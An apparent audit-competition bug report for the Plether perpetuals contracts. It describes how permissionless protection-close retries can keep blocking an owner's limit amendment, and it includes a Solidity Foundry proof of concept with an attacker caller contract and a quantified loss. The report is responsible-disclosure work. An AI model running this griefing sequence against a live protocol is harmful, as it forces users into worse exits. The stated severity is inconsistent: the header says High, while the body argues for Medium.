# \#97783 [SC-High] Permissionless retries of a failed protection close can indefinitely block the owner's limit amendment, forcing a worse exit

**Submitted on Nov 3rd 2026 at 06:04:26 UTC by @y4y for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97783
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

## Brief/Intro
When a position-protection close triggers, the owner retains a documented repair path: if market movement makes the recorded close-limit ceilings insufficient, the owner can call `amendLatchedPositionProtectionCloseLimits` while the protection is `Latched` and then retry. That amendment requires (a) status `Latched` and (b) zero pending orders for the account.

Two permissionless flows defeat it:

1. A failed close attempt relatches the protection, but `retryPositionProtectionClose` is callable by anyone and atomically queues a fresh full-position child order (zero bounty, same retained ceilings) and flips the status back to `Triggered`. If the caller's retry lands before the owner's separate amendment transaction, the amendment reverts with `ProtectionNotLatched`.
2. For an overdue child, anyone can call `OrderRouter.expireOrder` and `retryPositionProtectionClose` in a single transaction (expiry relatches and deletes the child before returning), eliminating even the inter-transaction amendment window.

Each retry produces a fresh order ID and execution deadline (default 60s); there is no retry limit or protection-wide timeout. While protection is active, the owner's ordinary orders — including closes — revert with `ProtectionActive`, and the cancel paths require `PendingOpen`/`Armed`, so the owner has no alternative exit while being preempted.

## Vulnerability Details
- `PositionProtectionBook.amendLatchedPositionProtectionCloseLimits` requires `Latched` + `pendingOrderCounts == 0` (`PositionProtectionBook.sol:315-327`).
- `PositionProtectionBook.retryPositionProtectionClose` is permissionless; it queues a new child and `_recordCloseAttempt` flips `Latched → Triggered` (`PositionProtectionBook.sol:382-429, 564-577`).
- Failed/expired attempts relatch via `handleFailedProtectionAttempt` whenever the position still matches its recorded side/size (`PositionProtectionBook.sol:610-675, 1010-1022`).
- `OrderRouter.expireOrder` is permissionless and processes the protection failure (relatch) before deleting the order, enabling atomic expire+retry (`OrderRouter.sol:191-196, 292-331`).
- Retry children carry zero execution bounty and the retained ceilings (`OrderLiquidationBatchLogic.sol:186-210`); ordinary `commitOrder` reverts `ProtectionActive` during active protection (`OrderLiquidationBatchLogic.sol:313-315`).

The defect is not the existence of financial ceilings or of permissionless retries (both are documented design), but that the **only** owner repair entry point can be preempted by any unrelated caller, repeatedly, at gas-only cost.

**Preconditions and honest limitations**

- The position must trigger while retained ceilings later become insufficient (ordinary market movement suffices: `size × oldPrice ≤ ceiling < size × newPrice`).
- Persistent blocking requires the attacker to keep winning the ordering race; it ends on a successful close, position change, liquidation, or a timely amendment. A contract-wallet owner can atomically expire+amend to escape; an EOA owner cannot (amendment checks `msg.sender`).
- No fixed outage duration is guaranteed by the code alone; Medium (griefing) reflects the repeatable, cheap denial of the documented repair path and the quantified downstream loss.
- Distinct from the October 15 scan's unpaid-close incentive issue and from Cecuro MED-9 (missing financial ceilings): retaining ceilings fixes MED-9 but does not protect the amendment opportunity, and Cecuro's own response relies on the owner-amendment path this issue blocks.

## Impact Details
Setup: ALICE opens a LONG of 10,000 synthetic tokens with 2,000 USDG margin at mark 1.00000000. She sets a take-profit trigger at 0.90000000 with `maxExecutionNotionalAssets` exactly sufficient at the trigger (9,000 USDG). (The CFD basket is inverse: LONG profits as the mark falls.)

1. Mark falls to 0.90000000; a keeper triggers protection → child close order created (`Triggered`).
2. Mark rebounds to 0.91000000 before execution. Close notional is now 9,100 USDG > 9,000 USDG ceiling → execution fails `ConstraintViolation` → protection relatches.
3. Attacker (any EOA/contract, no stake, no funding) calls `retryPositionProtectionClose` → status `Triggered`, fresh pending child.
4. Owner's `amendLatchedPositionProtectionCloseLimits` reverts `ProtectionNotLatched`. Owner's ordinary close reverts `ProtectionActive`; cancel reverts `ProtectionNotArmed`.
5. Steps 2–4 repeat for as long as the attacker keeps front-running (or uses atomic `expireOrder` + `retry`, leaving no window at all). The PoC demonstrates three consecutive cycles including the atomic variant.
6. The attacker stops whenever chosen; only then can the owner amend and close — at a worse price.

Quantified impact (snapshot control test): with no interference the owner amends, retries, and closes at 0.91000000. Under the blocking sequence the close only happens at 0.95000000. Difference: **10,000 × (0.95 − 0.91) = 400 USDG of exit value forfeited** (test asserts > 390 USDG net of fees), i.e. ~20% of the 2,000 USDG margin, plus continued borrow/carry accrual and liquidation exposure during the delay. Loss scales with position size and price drift, not with retry count.


## References
- `packages/perps/src/PositionProtectionBook.sol`
- `packages/perps/src/OrderRouter.sol`
- `packages/perps/src/router/OrderLiquidationBatchLogic.sol`

## Proof of Concept

## Proof of Concept
File: `packages/perps/test/perps/spec/trader/ProtectionAmendmentBlockPoC.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev Permissionless caller used by the PoC. Anyone can call both Router.expireOrder and
///      PositionProtectionBook.retryPositionProtectionClose; bundling them removes even the
///      inter-transaction amendment window after an overdue attempt.
contract PersistentRetryCaller {
    OrderRouter private immutable ROUTER;
    IPositionProtectionActions private immutable BOOK;

    constructor(address router_, address book_) {
        ROUTER = OrderRouter(router_);
        BOOK = IPositionProtectionActions(book_);
    }

    function retry(uint64 protectionId) external returns (uint64 orderId) {
        return BOOK.retryPositionProtectionClose(protectionId);
    }

    function expireAndRetry(uint64 orderId, uint64 protectionId) external returns (uint64 retryOrderId) {
        ROUTER.expireOrder(orderId);
        return BOOK.retryPositionProtectionClose(protectionId);
    }
}

/// PoC for: permissionless retries can block latched close-limit amendments (M-06).
/// A failed/expired protection close relatches, but any caller can immediately queue a fresh
/// zero-bounty child with the retained (now insufficient) ceilings, flipping the protection back
/// to Triggered. The owner-only amendment requires Latched status and an empty queue, so the
/// owner's repair transaction reverts whenever the caller acts first — and active protection
/// blocks every ordinary order, including closes, in the meantime.
contract ProtectionAmendmentBlockPoC is BasePerpTest {

    IPositionProtectionActions internal protectionActions;
    IPositionProtectionViews internal protectionViews;
    PersistentRetryCaller internal caller;

    address internal constant ALICE = address(0xA11CE);
    address internal constant TRIGGER_KEEPER = address(0x7106);
    address internal constant EXECUTION_KEEPER = address(0xE0EC);

    uint256 internal constant MARK_PRICE = 1e8;
    uint256 internal constant TRIGGER_PRICE = 90_000_000;
    uint256 internal constant REBOUND_PRICE = 91_000_000;
    uint256 internal constant FINAL_PRICE = 95_000_000;
    uint256 internal constant POSITION_SIZE = 10_000e18;
    uint256 internal constant POSITION_MARGIN_ASSETS = 2000e6;

    function setUp() public override {
        super.setUp();
        address book = address(router.positionProtectionBook());
        protectionActions = IPositionProtectionActions(book);
        protectionViews = IPositionProtectionViews(book);
        caller = new PersistentRetryCaller(address(router), book);
        _fundTrader(ALICE, 20_000e6);
        _refreshMark(MARK_PRICE);
    }

    /// Repeated cycles: a failed close relatches, a permissionless retry re-triggers, and the
    /// owner cannot amend, close, or cancel in between.
    function test_PoC_PermissionlessRetryBlocksOwnerAmendmentRepeatedly() public {
        uint64 protectionId = _protectedPositionWithExactCeiling();
        PositionProtectionTypes.CloseFinancialLimits memory generous = _generousLimits();

        _triggerAt(protectionId, TRIGGER_PRICE);
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Triggered);

        // An ordinary rebound makes the retained notional ceiling insufficient before execution.
        uint64 childId = protectionViews.getPositionProtection(protectionId).linkedOrderId;
        _executeFailingClose(childId, REBOUND_PRICE);
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched);
        assertEq(router.pendingOrderCounts(ALICE), 0, "relatch leaves a zero-length amendment window");

        // Cycle 1: the caller queues a fresh child before the owner's separate amendment lands.
        uint64 retryOne = caller.retry(protectionId);
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Triggered);
        assertEq(router.pendingOrderCounts(ALICE), 1, "retry installs a fresh pending child");

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, generous);

        // While protection is active the owner cannot exit or cancel through any ordinary path.
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(CfdTypes.Side.LONG, POSITION_SIZE, 0, 0, true);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        protectionActions.cancelPositionProtection(protectionId);

        // Cycle 2: the retained ceilings keep failing, and each relatch is re-preempted.
        _executeFailingClose(retryOne, REBOUND_PRICE);
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched);
        uint64 retryTwo = caller.retry(protectionId);
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Triggered);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, generous);

        // Cycle 3: expiry variant. Atomic expire+retry leaves no inter-transaction window at all.
        uint64 deadline = router.lifecycleBook().orderTiming(retryTwo).executionDeadline;
        vm.warp(uint256(deadline) + 1);
        uint64 retryThree = caller.expireAndRetry(retryTwo, protectionId);
        assertGt(retryThree, retryTwo, "expiry+retry installs another fresh child");
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Triggered);

        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, generous);

        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, POSITION_SIZE, "position stays open and trade-locked throughout");
    }

    /// Snapshot control: an unopposed amendment repairs the close at REBOUND_PRICE; the blocked
    /// amendment forces the exit at FINAL_PRICE, quantifying the additional loss. LONG here
    /// profits as the mark falls, so the delayed exit decays while the mark rises.
    function test_PoC_BlockedAmendmentQuantifiedLoss() public {
        uint64 protectionId = _protectedPositionWithExactCeiling();
        _triggerAt(protectionId, TRIGGER_PRICE);
        uint64 childId = protectionViews.getPositionProtection(protectionId).linkedOrderId;
        _executeFailingClose(childId, REBOUND_PRICE);
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched);

        uint256 snapshot = vm.snapshotState();

        // Control: with no interference the owner amends, retries, and the close executes.
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _generousLimits());
        vm.prank(ALICE);
        uint64 controlRetry = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory executionData = _mockPythUpdateData(REBOUND_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory controlResult = router.executeOrder(controlRetry, executionData);
        assertEq(uint8(controlResult.status), uint8(OrderV3Types.LifecycleStatus.Executed), "amended close works");
        uint256 controlBalance = clearinghouse.balanceAssets(ALICE);

        vm.revertToState(snapshot);

        // Blocked: each relatch is re-preempted while the mark keeps rising, so the stale
        // notional ceiling keeps failing and the amendment never lands.
        _assertBlockedCycle(protectionId, REBOUND_PRICE);
        _assertBlockedCycle(protectionId, FINAL_PRICE);

        // Only when the caller stops does the owner's separate amendment finally land.
        vm.prank(ALICE);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _generousLimits());
        vm.prank(ALICE);
        uint64 finalRetry = protectionActions.retryPositionProtectionClose(protectionId);
        bytes[] memory finalData = _mockPythUpdateData(FINAL_PRICE);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory finalResult = router.executeOrder(finalRetry, finalData);
        assertEq(uint8(finalResult.status), uint8(OrderV3Types.LifecycleStatus.Executed), "late repair closes");
        uint256 blockedBalance = clearinghouse.balanceAssets(ALICE);

        (uint256 remainingSize,,,,,,) = engine.positions(ALICE);
        assertEq(remainingSize, 0, "both branches fully close the position");
        // 10,000 tokens * (95.000000 - 91.000000) = 400 USDG of gain forfeited during the delay.
        assertGt(controlBalance - blockedBalance, 390e6, "blocked amendment costs the delayed exit");
    }

    function _assertBlockedCycle(uint64 protectionId, uint256 executionPrice) internal {
        uint64 child = caller.retry(protectionId);
        vm.prank(ALICE);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        protectionActions.amendLatchedPositionProtectionCloseLimits(protectionId, _generousLimits());
        _executeFailingClose(child, executionPrice);
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched);
    }

    function _protectedPositionWithExactCeiling() internal returns (uint64 protectionId) {
        _open(ALICE, CfdTypes.Side.LONG, POSITION_SIZE, POSITION_MARGIN_ASSETS, MARK_PRICE);
        PositionProtectionTypes.PositionProtectionParams memory params = _params(TRIGGER_PRICE, 0);
        // Exactly sufficient at the trigger price; at any higher price the ceiling is insufficient.
        params.closeLimits.maxExecutionNotionalAssets = POSITION_SIZE * TRIGGER_PRICE / 1e20;
        vm.prank(ALICE);
        protectionId = protectionActions.createPositionProtection(params);
    }

    function _executeFailingClose(uint64 orderId, uint256 price) internal {
        bytes[] memory executionData = _mockPythUpdateData(price);
        vm.prank(EXECUTION_KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, executionData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "stale ceiling must fail");
        assertEq(
            uint8(result.terminalReason),
            uint8(OrderV3Types.TerminalReason.ConstraintViolation),
            "failure must be the notional ceiling"
        );
    }

    function _assertStatus(
        uint64 protectionId,
        PositionProtectionTypes.PositionProtectionStatus expected
    ) internal view {
        assertEq(uint8(protectionViews.getPositionProtection(protectionId).status), uint8(expected), "status");
    }

    function _generousLimits()
        internal
        pure
        returns (PositionProtectionTypes.CloseFinancialLimits memory limits)
    {
        limits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _params(
        uint256 takeProfit,
        uint256 stopLoss
    ) internal pure returns (PositionProtectionTypes.PositionProtectionParams memory params) {
        params.takeProfitTriggerPrice = takeProfit;
        params.stopLossTriggerPrice = stopLoss;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max
        });
    }

    function _triggerAt(uint64 protectionId, uint256 price) internal returns (uint64 linkedOrderId) {
        _mockPythUpdateData(price);
        bytes[] memory updateData = _livePriceData(price);
        vm.prank(TRIGGER_KEEPER);
        linkedOrderId = protectionActions.triggerPositionProtection(protectionId, updateData);
    }

    function _refreshMark(uint256 price) internal {
        if (block.timestamp <= engine.lastMarkTime()) {
            vm.warp(uint256(engine.lastMarkTime()) + 1);
        }
        router.updateMarkPrice(_livePriceData(price));
    }

    function _livePriceData(uint256 price) internal view returns (bytes[] memory updateData) {
        bytes32[] memory ids = _basePythFeedIds();
        MockPyth.FeedUpdate[] memory ticks = new MockPyth.FeedUpdate[](ids.length);
        uint256 previous = engine.lastMarkTime();
        for (uint256 i; i < ids.length; ++i) {
            ticks[i] =
                MockPyth.FeedUpdate(ids[i], MockPyth.MockPrice(int64(uint64(price)), 0, -8, block.timestamp, previous));
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(ticks);
    }
}
```

Test result (both pass):

```
[PASS] test_PoC_BlockedAmendmentQuantifiedLoss()
[PASS] test_PoC_PermissionlessRetryBlocksOwnerAmendmentRepeatedly()
```

